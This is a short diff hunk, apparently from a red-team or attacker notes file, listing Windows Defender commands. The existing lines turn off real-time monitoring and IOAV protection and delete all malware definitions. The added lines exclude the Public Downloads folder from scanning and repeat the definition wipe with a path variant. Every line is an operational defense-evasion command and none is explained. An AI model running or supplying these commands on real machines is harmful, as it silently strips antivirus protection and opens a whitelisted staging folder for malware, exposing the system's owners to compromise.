@@ -11,3 +11,8 @@ Get-MPPreference
 Set-MPPreference -DisableRealTimeMonitoring $true
 Set-MpPreference -DisableIOAVProtection $true
 "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
+
+Add-MpPreference -ExclusionPath "C:\Users\Public\Downloads\"
+
+"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
+"%ProgramFiles%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
